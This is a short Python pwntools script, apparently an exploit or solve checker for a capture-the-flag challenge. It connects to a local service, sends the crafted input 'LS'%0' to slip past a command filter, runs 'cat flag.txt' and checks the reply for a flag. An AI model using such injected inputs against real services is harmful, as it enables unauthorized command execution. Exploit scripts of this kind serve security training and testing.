#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

io = remote("localhost", 10015)

payload = b"LS'%0"

io.sendlineafter(b"> ", payload)
io.sendlineafter(b"run\n", b"cat flag.txt")

flag = io.recv()

if b"unipi" in flag:
    print("Got flag")
    exit(0)

print("ERR - Flag not found running exp")
exit(1)